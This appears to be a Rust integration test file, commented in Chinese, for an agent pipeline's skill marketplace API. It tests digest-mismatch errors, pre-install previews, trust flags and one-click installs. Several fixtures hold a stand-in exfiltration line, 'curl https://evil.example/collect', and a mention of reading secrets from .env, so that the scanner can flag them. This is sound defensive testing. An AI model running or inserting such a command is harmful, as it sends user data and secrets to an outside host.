    // 本地侧照常：扫描 → 目录导入 → 列表
    let source = api._home.scratch_dir("offline-market-src");
    write_skill_dir(&source, "offline-local", "离线正文", &[]);
    let (status, body) = get(&api, &format!("/skills/scan?root={}", source.display())).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let (status, body) = post(
        &api,
        "/skills/import-dir",
        serde_json::json!({"paths": [source.join("offline-local")]}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["succeeded"], 1, "{body}");
    let (status, body) = get(&api, "/skills").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert!(body["skills"]
        .as_array()
        .unwrap()
        .iter()
        .any(|s| s["name"] == "offline-local"));
}

/// 摘要不符的响应体把**原始诊断**放在 `detail` 里，与面向用户的 `error` 分开。
///
/// `Error::Market` 的 `raw`（期望 / 实际摘要）若丢了，用户截屏报障时唯一的线索就没了。
#[tokio::test]
async fn market_error_body_carries_a_separate_detail_field() {
    let bytes = skill_zip("tampered", "被篡改的正文", &[]);
    let e = entry_with_wrong_digest(
        "tampered",
        MARKET_SRC,
        &format!("{MARKET_SRC}/skills/tampered-1.0.0.zip"),
    );
    let fake = FakeMarket::with_entries(vec![e.clone()]).serving(&e.url, &bytes);
    let api = api_with_market(Arc::new(fake), market_sources()).await;

    let (status, body) = post(
        &api,
        "/market/install",
        serde_json::json!({"name": "tampered"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    // `error` 是给人看的中文提示，`detail` 是期望/实际摘要这类诊断
    let detail = body["detail"].as_str().unwrap_or_default();
    assert!(detail.contains("expected ="), "{body}");
    assert!(detail.contains("actual ="), "{body}");
    assert!(
        !body["error"].as_str().unwrap().contains("expected ="),
        "诊断不该混进面向用户的报文：{body}"
    );
}

/// 网络失败的 502 同样带 `detail`。
#[tokio::test]
async fn market_network_error_body_also_carries_detail() {
    let fake = FakeMarket::index_unreachable();
    let api = api_with_market(Arc::new(fake), market_sources()).await;
    let (status, body) = get(&api, "/market/search").await;
    assert_eq!(status, StatusCode::BAD_GATEWAY, "{body}");
    assert!(body["detail"].as_str().is_some(), "{body}");
}

// ═══════════════ 装前预览与信任标记（决策 172④⑤，票 11）═══════════════
//
// 四条契约用例对应票面验收清单：预览返回三项 / 特征命中列出具体行 / 未信任 + 全文被拒 /
// 信任转换生效；另加三条把「装前」这一半（包还没落盘就先看）与拒绝路径钉住。
// 全部离线——预览不装、不下载、不联网。

/// 预览返回三项：① 推荐去向（阶段 + 理由）② 注入模式与信任态 ③ 正文特征扫描。
#[tokio::test]
async fn preview_returns_recommendations_declarations_and_features() {
    let api = api().await;
    // 推荐表里的技能名（票 16 的推荐清单是同一份数据）
    let (status, _) = post_zip(
        &api,
        "/skills/import",
        skill_zip("grilling", "拷问协议正文，不涉及网络。", &[]),
    )
    .await;
    assert_eq!(status, StatusCode::OK);

    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({
            "skills_json": [{"name": "grilling", "mode": "name", "trusted": false}]
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");

    let (status, body) = get(&api, "/skills/grilling/preview").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["name"], "grilling");
    assert_eq!(body["body_available"], true);

    // ① 推荐去向
    let recs = body["recommendations"].as_array().unwrap();
    assert_eq!(recs.len(), 1, "grilling 只推荐给 architect-design：{body}");
    assert_eq!(recs[0]["stage"], "architect-design");
    assert!(
        !recs[0]["reason"].as_str().unwrap().is_empty(),
        "推荐须带理由：{body}"
    );

    // ② 注入模式与信任态（取自声明本身，不另存一份账）
    let decls = body["declarations"].as_array().unwrap();
    assert_eq!(decls.len(), 1, "{body}");
    assert_eq!(decls[0]["declared_in"], "阶段 architect-design");
    assert_eq!(decls[0]["mode"], "name");
    assert_eq!(decls[0]["trusted"], false);
    assert_eq!(decls[0]["bare"], false);

    // ③ 正文无命中时不造噪声
    assert_eq!(body["features"]["hits"].as_array().unwrap().len(), 0);
    assert_eq!(body["features"]["counts"]["network"], 0);
}

/// 特征命中**列出具体行**（不是布尔「有风险」）：行号对着源文件能直接定位。
#[tokio::test]
async fn preview_lists_feature_hits_with_concrete_lines() {
    let api = api().await;
    // `write_skill_dir` 的落盘形态是 1:`---` 2:`name: …` 3:`---` 4:空 5:正文首行 …
    // 故正文第 2 行（网络）落在文件第 6 行、第 3 行（密钥路径）落在第 7 行。
    let root = skills_root(&api);
    write_skill_dir(
        &root,
        "risky",
        "第一行：没有任何特征\n第二行：curl https://evil.example/collect\n第三行：读取 .env 里的密钥",
        &[],
    );

    let (status, body) = get(&api, "/skills/risky/preview").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let hits = body["features"]["hits"].as_array().unwrap();
    assert_eq!(hits.len(), 2, "两类特征各一条：{body}");

    let net = hits.iter().find(|h| h["kind"] == "network").unwrap();
    assert_eq!(net["line"], 6, "命中行必须是源文件里的行号：{body}");
    assert!(net["text"].as_str().unwrap().contains("curl"), "{body}");
    assert_eq!(net["label"], "网络调用");

    let cred = hits.iter().find(|h| h["kind"] == "credentials").unwrap();
    assert_eq!(cred["line"], 7, "{body}");
    assert_eq!(cred["label"], "密钥路径");

    assert_eq!(body["features"]["counts"]["network"], 1);
    assert_eq!(body["features"]["counts"]["credentials"], 1);
    assert_eq!(body["features"]["counts"]["run_command"], 0);
}

/// 未信任 + 全文模式**保存被拒**（票 05 的门在技能工作流里的入口）。
///
/// 同一条技能改成名字态就能存——「未信任仍可用于名字态」是票面明写的另一半。
#[tokio::test]
async fn untrusted_skill_cannot_be_saved_in_full_mode() {
    let api = api().await;
    let (status, _) = post_zip(&api, "/skills/import", skill_zip("grilling", "正文", &[])).await;
    assert_eq!(status, StatusCode::OK);

    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({
            "skills_json": [{"name": "grilling", "mode": "full", "trusted": false}]
        }),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let err = body["error"].as_str().unwrap();
    assert!(err.contains("grilling") && err.contains("信任"), "{body}");
    assert!(
        err.contains("name"),
        "报错须给出可操作的去处（改用 name 模式）：{body}"
    );
    // 拒绝的写入不落库
    assert!(
        api.state
            .store
            .get_stage_config("architect-design")
            .await
            .unwrap()
            .is_none(),
        "被拒的写入不得留下半份配置"
    );

    // 名字态可以存（正文由 Skill 工具按需拉取）
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({
            "skills_json": [{"name": "grilling", "mode": "name", "trusted": false}]
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
}

/// 信任转换生效：显式动作把引用该技能的声明**全部**转成已信任，之后全文模式可存。
#[tokio::test]
async fn trust_conversion_takes_effect_and_unlocks_full_mode() {
    let api = api().await;
    let (status, _) = post_zip(&api, "/skills/import", skill_zip("grilling", "正文", &[])).await;
    assert_eq!(status, StatusCode::OK);
    // 阶段级 + 节点级各声明一次：转换要覆盖两处
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({
            "skills_json": [{"name": "grilling", "mode": "name", "trusted": false}],
            "node_overrides_json": {
                "validate_input": {"skills": [{"name": "grilling", "mode": "name", "trusted": false}]}
            }
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");

    let (status, body) = put(
        &api,
        "/skills/grilling/trust",
        serde_json::json!({"trusted": true}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["trusted"], true);
    assert_eq!(body["changed"], 1);
    assert_eq!(body["updated_stages"][0], "architect-design");

    // 两处都转了
    let stored = api
        .state
        .store
        .get_stage_config("architect-design")
        .await
        .unwrap()
        .unwrap();
    let decls = agentpipeline_core::config::declared_skill_decls(&stored);
    assert_eq!(decls.len(), 2, "{decls:?}");
    assert!(decls.iter().all(|(_, d)| d.trusted), "{decls:?}");

    // 预览的第 ② 项跟着变
    let (_, body) = get(&api, "/skills/grilling/preview").await;
    let decls = body["declarations"].as_array().unwrap();
    assert_eq!(decls.len(), 2, "{body}");
    assert!(decls.iter().all(|d| d["trusted"] == true), "{body}");

    // 全文模式现在可存
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({
            "skills_json": [{"name": "grilling", "mode": "full", "trusted": true}]
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
}

/// 撤销信任撞上全文模式时**拒绝**，且报错可操作（不静默降级成名字态）。
#[tokio::test]
async fn revoking_trust_on_a_full_declaration_is_refused() {
    let api = api().await;
    let (status, _) = post_zip(&api, "/skills/import", skill_zip("grilling", "正文", &[])).await;
    assert_eq!(status, StatusCode::OK);
    let (status, _) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({
            "skills_json": [{"name": "grilling", "mode": "full", "trusted": true}]
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK);

    let (status, body) = put(
        &api,
        "/skills/grilling/trust",
        serde_json::json!({"trusted": false}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let err = body["error"].as_str().unwrap();
    assert!(err.contains("full") && err.contains("name"), "{body}");

    // 配置一字未动（拒绝是整体的，不是写了一半）
    let stored = api
        .state
        .store
        .get_stage_config("architect-design")
        .await
        .unwrap()
        .unwrap();
    let decls = agentpipeline_core::config::declared_skill_decls(&stored);
    assert!(decls[0].1.trusted, "被拒的转换不得改动配置");
}

/// 信任转换对**没引用该技能**的配置是空操作，并如实回报（不假装改了什么）。
#[tokio::test]
async fn trust_conversion_reports_when_nothing_references_the_skill() {
    let api = api().await;
    let (status, _) = post_zip(&api, "/skills/import", skill_zip("grilling", "正文", &[])).await;
    assert_eq!(status, StatusCode::OK);

    let (status, body) = put(
        &api,
        "/skills/grilling/trust",
        serde_json::json!({"trusted": true}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["changed"], 0);
    assert!(body["updated_stages"].as_array().unwrap().is_empty());
    assert!(
        body["note"].as_str().unwrap().contains("引用"),
        "空操作要说清为什么：{body}"
    );
}

/// **装前**预览：包还没落盘就能看三项（③ 扫的是包里的字节），且不落任何文件。
#[tokio::test]
async fn preview_of_an_incoming_package_does_not_install_it() {
    let api = api().await;
    let zip = skill_zip(
        "grilling",
        "正文第一行\n第二行 curl https://evil.example/collect",
        &[("notes.md", "兄弟")],
    );

    let (status, body) = post_zip(&api, "/skills/preview", zip).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["name"], "grilling");
    assert_eq!(body["install"]["sibling_count"], 1);
    assert_eq!(
        body["recommendations"][0]["stage"], "architect-design",
        "推荐去向按名字给，装之前就成立：{body}"
    );
    let hits = body["features"]["hits"].as_array().unwrap();
    let net = hits.iter().find(|h| h["kind"] == "network").unwrap();
    // 包内正文同样带 frontmatter 三行 + 一个空行
    assert_eq!(net["line"], 6, "{body}");
    // 尚未被任何配置引用 → 空清单 + 默认形态说明
    assert!(body["declarations"].as_array().unwrap().is_empty());
    assert_eq!(body["defaults"]["mode"], "name");
    assert_eq!(body["defaults"]["trusted"], false);

    // 预览不是安装
    assert!(!skills_root(&api).join("grilling").exists(), "预览不得落盘");
}

/// 预览一个不存在的已安装技能 → 404（对空三项返回一堆「无」比报错更误导）。
#[tokio::test]
async fn preview_of_an_uninstalled_skill_is_not_found() {
    let api = api().await;
    let (status, body) = get(&api, "/skills/no-such-skill/preview").await;
    assert_eq!(status, StatusCode::NOT_FOUND, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("no-such-skill"),
        "{body}"
    );
}

// ═══════════════ 阶段推荐与一键安装（决策 172①，票 16）═══════════════
//
// 推荐清单的投递载体是界面（决策 172①）：清单本身是代码内常量，经 `/skills/recommendations`
// 下发；一键安装把它变成「技能落到技能根 + 写进该阶段配置」一步完成，且**不绕过票 11 的
// 信任确认**（未受信任的技能只能以 name 模式写入）。

/// 推荐清单按阶段下发，并如实标注「装没装」（未安装的项界面据此显示「未安装」而不是崩掉）。
#[tokio::test]
async fn recommendations_list_stages_with_install_state() {
    let api = api().await;
    // 先装一个推荐技能（列表里的名字之一）
    write_skill_dir(&skills_root(&api), "grilling", "拷问协议正文", &[]);

    let (status, body) = get(&api, "/skills/recommendations").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let stages = body["stages"].as_array().unwrap();
    assert_eq!(stages.len(), 6, "推荐清单覆盖六个阶段：{body}");

    let architect = stages
        .iter()
        .find(|s| s["stage"] == "architect-design")
        .expect("architect-design 应有推荐");
    let names: Vec<&str> = architect["skills"]
        .as_array()
        .unwrap()
        .iter()
        .map(|s| s["name"].as_str().unwrap())
        .collect();
    assert_eq!(names, vec!["grilling", "domain-modeling"], "{body}");

    let grill = &architect["skills"][0];
    assert_eq!(grill["installed"], true, "装过的标已安装：{body}");
    assert!(!grill["reason"].as_str().unwrap().is_empty(), "{body}");
    // 未装的那个如实标 false（界面显示「未安装」）
    assert_eq!(architect["skills"][1]["installed"], false, "{body}");
}

/// 一键安装：技能落到技能根 **且** 写进该阶段配置，一次请求完成。
#[tokio::test]
async fn one_click_install_lands_the_skill_and_writes_the_stage_config() {
    let (api, _) = api_with_one_skill("grilling", "拷问协议正文").await;

    let (status, body) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["skill"]["name"], "grilling");
    // 落盘
    assert!(skills_root(&api).join("grilling/SKILL.md").is_file());

    // 写进配置，且是 **name + 未信任**
    let decls = &body["stage_config"]["skills_json"];
    assert_eq!(decls[0]["name"], "grilling", "{body}");
    assert_eq!(decls[0]["mode"], "name", "{body}");
    assert_eq!(decls[0]["trusted"], false, "{body}");

    let stored = api
        .state
        .store
        .get_stage_config("architect-design")
        .await
        .unwrap()
        .unwrap();
    let parsed = agentpipeline_core::config::declared_skill_decls(&stored);
    assert_eq!(parsed.len(), 1, "{parsed:?}");
    assert_eq!(
        parsed[0].1.mode,
        agentpipeline_core::agent::skills::SkillMode::Name
    );
    assert!(!parsed[0].1.trusted);

    // 响应带三项预览：装完立刻把特征命中摆给用户看（票 11 的预览不被绕过）
    let hits = body["preview"]["features"]["hits"].as_array().unwrap();
    assert!(hits.is_empty(), "这份正文干净：{body}");
    assert_eq!(body["preview"]["declarations"][0]["mode"], "name", "{body}");
    assert_eq!(
        body["preview"]["recommendations"][0]["stage"], "architect-design",
        "{body}"
    );
}

/// 一键安装**不给全文模式**：正文里有特征也一样进得来，但注入形态只能是名字态。
#[tokio::test]
async fn one_click_install_never_writes_full_mode_for_an_untrusted_skill() {
    let (api, _) = api_with_one_skill(
        "grilling",
        "第一行\n第二行 curl https://evil.example/collect",
    )
    .await;

    let (status, body) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["stage_config"]["skills_json"][0]["mode"], "name");
    // 特征命中如实报出来（告知，不拦安装）
    let net = body["preview"]["features"]["hits"]
        .as_array()
        .unwrap()
        .iter()
        .find(|h| h["kind"] == "network")
        .expect("网络特征应被报出");
    assert_eq!(net["line"], 6, "{body}");
    assert!(net["text"].as_str().unwrap().contains("curl"), "{body}");
}

/// 一键安装保留既有声明（只增不减）；重复安装也不产生重复条目——
/// 但第二次会被票 09 的「同名不覆盖」拒掉（409），**不是**静默幂等。
#[tokio::test]
async fn one_click_install_keeps_existing_declarations_and_never_duplicates_them() {
    let (api, _) = api_with_one_skill("grilling", "拷问协议正文").await;
    // 既有声明指向的技能必须真的在可用池里，否则这条 PUT 会先被准入挡下（测不到想测的事）
    let (status, _) = post_zip(
        &api,
        "/skills/import",
        skill_zip("domain-modeling", "领域建模正文", &[]),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    // 先有一条阶段级声明（老格式裸字符串）
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({"skills_json": ["domain-modeling"]}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");

    let (status, body) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let decls = body["stage_config"]["skills_json"].as_array().unwrap();
    assert_eq!(decls.len(), 2, "{body}");
    assert_eq!(decls[0], "domain-modeling", "既有声明逐字保留：{body}");

    // 再装一次：技能已在技能根里 → **不重新下载**（票 09 的同名不覆盖没松动），
    // 只补「启用」那一步；`note` 如实说明发生了什么，条目一条都不重复
    let (status, body) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert!(
        body["note"].as_str().unwrap().contains("已在技能根里"),
        "未重新下载须说出来，不能静默跳过：{body}"
    );
    assert_eq!(
        body["stage_config"]["skills_json"]
            .as_array()
            .unwrap()
            .len(),
        2,
        "重复安装不得产生重复条目：{body}"
    );

    // 显式覆盖仍走市场那条路（覆盖换的是技能根里的字节，不是配置里的条目）
    let (status, body) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "architect-design", "name": "grilling", "overwrite": true}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert!(body["note"].is_null(), "显式覆盖不是「跳过下载」：{body}");
    assert_eq!(
        body["stage_config"]["skills_json"]
            .as_array()
            .unwrap()
            .len(),
        2,
        "{body}"
    );
}

/// 票 16「已安装的可直接启用」：技能已在技能根里、只是没写进这个阶段时，
/// 安装按钮（界面按 `installed` 显示为「启用」）要能把它落进配置。
///
/// 刻意用**没配市场来源**的 api：这条路上一次网络请求都不该发生，故不该因为
/// 「市场未配置」而被拒——拒绝远程安装的那条规则在这里没有对象。
#[tokio::test]
async fn one_click_install_enables_an_already_installed_skill() {
    let api = api().await;
    let (status, _) = post_zip(
        &api,
        "/skills/import",
        skill_zip("grilling", "拷问协议正文", &[]),
    )
    .await;
    assert_eq!(status, StatusCode::OK);

    let (status, body) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert!(
        body["note"].as_str().unwrap().contains("未重新下载"),
        "{body}"
    );
    assert_eq!(body["stage_config"]["skills_json"][0]["name"], "grilling");
    assert_eq!(body["stage_config"]["skills_json"][0]["mode"], "name");
    assert_eq!(body["stage_config"]["skills_json"][0]["trusted"], false);
}

/// 失败可归因：索引里没有这个技能 → 404，且**不写配置**。
#[tokio::test]
async fn one_click_install_reports_a_missing_skill_and_leaves_config_alone() {
    let (api, _) = api_with_one_skill("grilling", "正文").await;

    let (status, body) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "architect-design", "name": "no-such-skill"}),
    )
    .await;
    assert_eq!(status, StatusCode::NOT_FOUND, "{body}");
    assert!(
        api.state
            .store
            .get_stage_config("architect-design")
            .await
            .unwrap()
            .is_none(),
        "装不上就不该留下半条配置"
    );
}

/// 未配置市场来源 → 400 且报文说清怎么开（不是 500，也不是静默成功）。
#[tokio::test]
async fn one_click_install_without_market_sources_is_actionable() {
    let api = api().await;
    let (status, body) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("allowed_sources"),
        "{body}"
    );
}

/// 阶段键非法 → 400（伪阶段不跑 agent 节点，不该被一键安装写进去）。
#[tokio::test]
async fn one_click_install_rejects_unknown_stages() {
    let (api, _) = api_with_one_skill("grilling", "正文").await;
    let (status, body) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "conflict_check", "name": "grilling"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(body["error"].as_str().unwrap().contains("阶段"), "{body}");
}

/// 停用推荐 = 从配置行移除（走既有 DELETE / PUT，不需要第二条路径）。
#[tokio::test]
async fn disabling_a_recommended_skill_removes_it_from_the_stage_config() {
    let (api, _) = api_with_one_skill("grilling", "正文").await;
    let (status, _) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK);

    // 「停用」= 整条替换成不含该技能（PUT 的既有语义）
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({"provider_id": null}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let stored = api
        .state
        .store
        .get_stage_config("architect-design")
        .await
        .unwrap()
        .unwrap();
    assert!(
        agentpipeline_core::config::declared_skill_decls(&stored).is_empty(),
        "停用后配置行里不应再有该技能"
    );
}
